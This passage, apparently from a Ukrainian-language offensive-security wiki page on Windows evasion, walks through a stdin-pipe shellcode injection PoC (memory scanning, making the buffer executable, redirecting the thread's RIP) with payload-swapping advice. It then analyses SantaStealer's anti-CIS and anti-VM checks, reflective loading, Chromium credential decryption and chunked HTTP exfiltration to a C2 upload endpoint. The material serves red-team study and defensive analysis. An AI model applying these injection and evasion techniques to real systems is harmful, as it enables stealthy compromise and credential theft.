Попри опис як «іменований pipe», у довідковій реалізації викликається `CreatePipe`, що створює **анонімний pipe**. Windows внутрішньо реалізує анонімні pipe за допомогою унікально названих об’єктів pipe, але PoC не вибирає шлях `\\.\pipe\<name>` і не викликає `CreateNamedPipe`. Він створює дескриптори зі спадкуванням і дескриптором безпеки за замовчуванням, розміщує дескриптор читання в `STARTUPINFO.hStdInput`, установлює `STARTF_USESTDHANDLES` і запускає новий дочірній процес зі ввімкненим спадкуванням дескрипторів. Тому цей PoC запускає наданий виконуваний файл консолі, а не під’єднує pipe до наявного процесу.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Довідковий алгоритм

У реалізації використовується такий ланцюжок дій:<sup>[[41]](#references)</sup>

1. Створити пари анонімних pipe для `STDIN` і `STDOUT` дочірнього процесу. Вимкнути спадкування для двох дескрипторів батьківського боку й закрити дублікати дескрипторів дочірнього боку в батьківському процесі після створення процесу.
2. Запустити інтерактивний виконуваний файл, наприклад `netsh.exe` або `nslookup.exe`, із прапорцем `CREATE_NEW_CONSOLE`. Дочірній процес успадковує перенаправлені стандартні дескриптори.
3. Надіслати весь бінарний масив `rawData` за допомогою `WriteFile` через дескриптор `STDIN` батьківського боку. Консольна програма зчитує байти й залишає їхню копію в одній зі своїх приватних закомічених областей.
4. Переглянути адресний простір дочірнього процесу за допомогою `VirtualQueryEx`, прочитати кандидатні області `MEM_PRIVATE` за допомогою `ReadProcessMemory` і знайти маркер на початку `rawData`.
5. Змінити дозвіл виявленого буфера на `PAGE_EXECUTE_READWRITE` за допомогою `VirtualProtectEx`.
6. Визначити основний потік, призупинити його, установити `RIP` у `found_address + 0x19` за допомогою `NtSetContextThread` і відновити його роботу.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Надана реалізація призначена лише для x64: вона змінює `CONTEXT.Rip`, а вбудований payload — це x64 shellcode. `rawData` починається з маркера довжиною 25 байтів, тому виконувані байти починаються зі зсуву `0x19` у шістнадцятковому форматі. Замінюючи payload, збережіть цей формат або узгоджено оновіть маркер, вектор пошуку, розмір масиву та зсув виконання. У коментарях до вихідного коду також зазначено `0x0A`, `0x0D` і `0x1A` як заборонені символи. Цей процес не змінює токен або привілеї дочірнього процесу.<sup>[[41]](#references)</sup>

Приклади невеликих нативних допоміжних програм і шаблонів компіляції payload наведено в [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Тактики SantaStealer для безфайлового ухилення та викрадення облікових даних

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні info-stealers поєднують AV bypass, anti-analysis і доступ до облікових даних в одному процесі.<sup>[[24]](#references)</sup>

### Перевірка розкладки клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури за допомогою `GetKeyboardLayoutList`. Якщо виявлено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску stealers, щоб ніколи не активуватися в виключених регіонах, залишаючи при цьому артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A обходить список процесів, хешує кожне ім’я за допомогою власної ковзної контрольної суми та порівнює результат із вбудованими списками для debugger/sandbox; повторно обчислює контрольну суму для імені комп’ютера та перевіряє робочі каталоги, як-от `C:\analysis`.
- Варіант B перевіряє властивості системи (мінімальну кількість процесів, нещодавній час роботи), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує перевірки часу навколо затримок, щоб виявити покрокове виконання. За будь-якого збігу процес переривається до запуску модулів.

### Безфайловий helper + подвійне reflective loading через ChaCha20

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну відображається в пам’яті; у безфайловому режимі він самостійно розв’язує імпорти та релокації, тож жодні артефакти helper не записуються.
- Цей helper зберігає DLL другого етапу, двічі зашифровану ChaCha20 (два 32-байтові ключі + 12-байтові nonce). Після обох проходів він виконує reflective loading blob (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують reflective process hollowing із direct-syscall для впровадження коду в запущений браузер Chromium, успадковують ключі AppBound Encryption і розшифровують паролі/файли cookie/дані кредитних карток безпосередньо з баз даних SQLite, попри посилений захист ABE.

### Модульний збір у пам’яті та chunked HTTP exfil

- `create_memory_based_log` перебирає глобальну таблицю вказівників на функції `memory_generators` і створює по одному потоку для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери та повідомляє кількість файлів після очікування завершення потоків протягом приблизно 45 секунд.
- Після завершення всі дані архівуються статично скомпонованою бібліотекою `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 секунд і передає архів частинами по 10 МБ через HTTP POST на `http://<C2>:6767/upload`, підробляючи браузерний boundary `multipart/form-data` (`----WebKitFormBoundary***`). Кожна частина містить `User-Agent: upload`, `auth: <build_id>`, необов’язковий `w: <campaign_tag>`, а до останньої частини додається `complete: true`, щоб C2 знав, що збірку даних завершено.

## References

- [1] [Розширені прийоми ухилення: точне підмінювання модулів](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – блог](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Стек викликів: більше жодних поблажок для malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – документація](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – приклад](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – приклад](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC для підроблення стека викликів](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Новий ланцюжок зараження та обфускація на основі ConfuserEx для DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Чи варто довіряти zero trust? Обхід перевірок стану пристрою Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – До ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: зловживання переспрямованими експортами](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Перелік переспрямованих експортів Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Порядок пошуку бібліотек DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Безпека процесів і права доступу](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Довідник EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Засіб запуску CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Протидія EDR за допомогою захищеного процесу Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Прорив захисної оболонки Windows Defender за допомогою перенаправлення папок](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Довідник команди mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – За чистою завісою: від RAT до builder і coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer уже в дорозі: новий амбітний infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – розшифрування Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: протидія malware на Node.js за допомогою трасування API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Спляча красуня: приспати Adaptix за допомогою Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Отруєння параметрів процесу](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Спляча красуня II: CFG, CET і підроблення стека](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Обфускація сну Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Приховування Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Зловживання Chrome Remote Desktop під час операцій Red Team: практичний посібник](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: перетворення драйвера усунення загроз Defender на примітив для операцій у ядрі](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Супровідний код MDSec для Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: створення функцій із самоприховуванням за допомогою LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – вихідний код InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – Функція CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Створення дочірнього процесу з перенаправленими потоками вводу й виводу](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
